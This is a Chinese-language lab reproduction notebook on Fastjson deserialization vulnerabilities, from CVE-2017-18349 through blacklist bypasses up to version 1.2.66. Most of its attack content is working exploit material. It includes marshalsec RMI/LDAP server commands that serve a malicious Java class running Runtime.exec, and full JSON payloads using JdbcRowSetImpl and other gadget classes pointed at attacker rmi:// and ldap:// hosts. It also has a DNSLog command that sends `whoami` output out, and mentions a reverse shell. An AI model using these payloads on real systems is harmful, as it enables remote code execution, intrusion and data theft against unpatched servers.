# Fastjson框架漏洞复现笔记

 **1、什么是JNDI？**  
JNDI是一组应用程序接口，为开发人员查找和访问各种资源提供了统一的通用接口。  
JNDI是应用程序设计的API，可以根据名字动态加载数据，支持的服务有以下几种：  
DNS、LDAP、RMI、CORBA对象服务。

 **2、RMI的作用？**  
RMI服务端可以通过References类来绑定一个外部的远程对象，当RMI绑定了References之后，首先会利用Referenceable.getReference()获取绑定对象的引用，并且在目录中保存，当客户端使用lookup获取对应名字的时候，会返回ReferenceWrapper类的代理文件，然后会调用getReference()获取Reference类，最终通过factory类将Reference转换为具体的对象实例。

### fastjson 1.2.24反序列化任意命令执行漏洞（CVE-2017-18349）

 **漏洞简介：**  
利用fastjson
autotype在处理json对象时，未对@type字段进行安全的安全性验证，攻击者可以传入危险类，并调用危险类连接远程RMI主机，通过其中的恶意类执行代码。  
 **影响版本：**  
fastjson < 1.2.25  
 **复现操作：**  
访问靶机。  
![16230841580599.jpg](https://image.3001.net/images/20210609/1623168748_60bf96ec16df2e370956f.jpg!small)  
靶机环境是Java 8u102。  
![16231228265889.jpg](https://image.3001.net/images/20210609/1623168760_60bf96f8e23bfc657d36a.jpg!small)  
在kali下安装javac环境。

    
    
    cd /opt
      curl http://www.joaomatosf.com/rnp/java_files/jdk-8u20-linux-x64.tar.gz -o jdk-8u20-linux-x64.tar.gz
      tar zxvf jdk-8u20-linux-x64.tar.gz
      rm -rf /usr/bin/java*
      ln -s /opt/jdk1.8.0_20/bin/j* /usr/bin
      javac -version
      java -version
    

![16231243207409.jpg](https://image.3001.net/images/20210609/1623168778_60bf970a2d86b0b7306e4.jpg!small)  
编译恶意类代码  
![16231245297966.jpg](https://image.3001.net/images/20210609/1623168791_60bf97171eb2f457dd54a.jpg!small)  
搭建http服务传输恶意文件

    
    
    python -m http.server 80
    

![16231360207900.jpg](https://image.3001.net/images/20210609/1623168807_60bf9727d15d846c3db25.jpg!small)  
编译并开启RMI服务：

    
    
    下载marshalsec：
    git clone https://github.com/mbechler/marshalsec.git
    安装maven：
    apt-get install maven
    

使用maven编译marshalsec成jar包，先进入下载的marshalsec文件中：

    
    
    mvn clean package -DskipTests
    

![16231337757752.jpg](https://image.3001.net/images/20210609/1623168824_60bf9738dafe80167aef2.jpg!small)  
接着启动一个RMI服务器，设置监听端口，并制定加载远程类TouchFile.class:

    
    
    java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "http://172.16.65.10/#test" 9999
    

![16231361401570.jpg](https://image.3001.net/images/20210609/1623168837_60bf974518acbbf1ea5ca.jpg!small)  
![16231361556514.jpg](https://image.3001.net/images/20210609/1623168844_60bf974c9bad6e22638f1.jpg!small)  
Burp修改包并写入POC：

    
    
    POST / HTTP/1.1
    Host: localhost:8090
    Accept-Encoding: gzip, deflate
    Accept: */*
    Accept-Language: en
    User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
    Connection: close
    Content-Type: application/json
    Content-Length: 161
    
    {
    "b":{
              "@type":"com.sun.rowset.JdbcRowSetImpl",
              "dataSourceName":"rmi://172.16.65.10:9999/test",
              "autoCommit":true
        }
    }
    

![16231410826374.jpg](https://image.3001.net/images/20210609/1623168857_60bf97596429eb42706fa.jpg!small)![16231410961343.jpg](https://image.3001.net/images/20210609/1623168865_60bf9761c649c7178f352.jpg!small)  
![16231411383609.jpg](https://image.3001.net/images/20210609/1623168872_60bf976846688462f8d60.jpg!small)  
反弹shell只需修改commands中内容即可。

###### DNSLog回显

    
    
    http://www.dnslog.cn/
    

进入网站后点击`Get SubDomain`获得地址。  
![16231414462854.jpg](https://image.3001.net/images/20210609/1623168888_60bf9778a3482debdfb64.jpg!small)

    
    
    "/bin/sh","-c","ping user.`whoami`.
    gk9a7i.dnslog.cn"
    

![16231415575645.jpg](https://image.3001.net/images/20210609/1623168907_60bf978bc02f7bff3649f.jpg!small)  
覆盖一下原文件  
![16231416581680.jpg](https://image.3001.net/images/20210609/1623168931_60bf97a3bd8bab0edb5be.jpg!small)![16231417910211.jpg](https://image.3001.net/images/20210609/1623168938_60bf97aa5d229bb88051b.jpg!small)  
成功回显。

### fastjson 1.2.47 远程命令执行漏洞

 **漏洞简介：**  
fastjson于1.2.24版本后增加了反序列化白名单，而在1.2.48之前的版本中，可以利用特殊构造的json字符串绕过白名单检测，成功执行任意命令。  
 **影响版本：**  
fastjson < 1.2.47  
 **复现操作：**  
访问靶机。  
![16231451097132.jpg](https://image.3001.net/images/20210609/1623168950_60bf97b6aed7d404c8af4.jpg!small)  
靶机环境是`openjdk:8u102`，这个版本没有`com.sun.jndi.rmi.object.trustURLCodebase`限制，可以使用RMI进行命令执行。

    
    
    // javac TouchFile.java
      import java.lang.Runtime;
      import java.lang.Process;
      public class Exploit {
          static {
              try {
                  Runtime rt = Runtime.getRuntime();
                  String[] commands = {"touch", "/tmp/dayutest"};
                  Process pc = rt.exec(commands);
                  pc.waitFor();
              } catch (Exception e) {
               // do nothing
            }
        } 
    }
    

开启marshalsec，并启动RMI服务。

    
    
    java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "http://172.16.65.10/#Exploit" 9999
    

发送payload，修改`Content-Type`为`application/json`。

    
    
    {
    "a":{
              "@type":"java.lang.Class",
              "val":"com.sun.rowset.JdbcRowSetImpl"
          },
          "b":{
              "@type":"com.sun.rowset.JdbcRowSetImpl",
              "dataSourceName":"rmi://172.16.65.10:9999/Exploit",
              "autoCommit":true
        } 
    }
    

![16231571214288.jpg](https://image.3001.net/images/20210609/1623168966_60bf97c6cf4970f10d324.jpg!small)  
成功反弹shell。

![16231485822324.jpg](https://image.3001.net/images/20210609/1623168980_60bf97d40f73767a4f415.jpg!small)

### 1、fastjson <= 1.2.41 漏洞

 **漏洞简介：**  
fastjson判断类名是否以`L`开头、以`;`结尾，是的话就提取出其中的类名再加载。  
 **exp：**

    
    
    {"@type":"Lcom.sun.rowset.JdbcRowSetImpl;","dataSourceName":"rmi://x.x.x.x:1098/jndi", "autoCommit":true}
    

### 2、fastjson <= 1.2.42 漏洞

 **漏洞简介：**  
1.2.42 版本新增了校验机制，如果输入类名的开头和结尾是l和;就将头和尾去掉，再进行黑名单验证。  
所以绕过需要在类名外部嵌套两层`L;`。

    
    
    类名：com.sun.rowset.JdbcRowSetImpl 
    绕过：LLcom.sun.rowset.JdbcRowSetImpl;;
    

**exp：**

    
    
    {
        "b":{
            "@type":"LLcom.sun.rowset.JdbcRowSetImpl;;",
            "dataSourceName":"rmi://xx.x.xx.xx:9999/poc",
            "autoCommit":true
        }
    }

### 3、fastjson <= 1.2.45漏洞

 **利用条件：**

    
    
    1）、目标服务端存在mybatis的jar包。
    2）、版本需为 3.x.x ～ 3.5.0
    3）、autoTypeSupport属性为true才能使用。（fastjson >= 1.2.25默认为false）
    

（比较鸡肋）  
使用黑名单绕过，`org.apache.ibatis.datasource`在1.2.46版本中被加入了黑名单。

    
    
    {"@type":"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory","properties":{"data_source":"ldap://localhost:1389/Exploit"}}
    

### 4、fastjson <= 1.2.47漏洞

 **利用条件：**

  * 小于 1.2.48 版本的通杀，autoType为关闭状态也可以。

  * loadClass中默认cache设置为true。

 **漏洞简介：**  
首先使用java.lang.CLass把获取到的类缓存到mapping中，然后直接从缓存中获取到了`com.sun.rowset.JdbcRowSetlmpl`这个类，绕过黑名单机制。

 **exp：**

    
    
    {
    "a": {
              "@type": "java.lang.Class",
              "val": "com.sun.rowset.JdbcRowSetImpl"
          },
          "b": {
              "@type": "com.sun.rowset.JdbcRowSetImpl",
              "dataSourceName": "rmi://x.x.x.x:1098/jndi",
              "autoCommit": true
    } }
    

### 5、fastjson <= 1.2.62漏洞

黑名单绕过exp：

    
    
    {"@type":"org.apache.xbean.propertyeditor.JndiConverter","AsText":"rmi://127.0.0.1:1099/exploit"}";
    

### 6、fastjson <= 1.2.66漏洞

 **利用条件：**  
autoTypeSupport属性为true才能使用。（fastjson >= 1.2.25默认为false）  
 **漏洞简介：**  
基于黑名单绕过。  
 **exp：**

    
    
    {"@type":"org.apache.shiro.jndi.JndiObjectFactory","resourceName":"ldap://192.168.80.1:1389/Calc"}
    
    {"@type":"br.com.anteros.dbcp.AnterosDBCPConfig","metricRegistry":"ldap://192.168.80.1:1389/Calc"}{"@type":"org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup","jndiNames":"ldap://x.x.x.x:1389/Calc"}
    
    {"@type":"com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig","properties": 
    
    {"@type":"java.util.Properties","UserTransacti
      on":"ldap://x.x.x.x:1389/Calc"}}
    

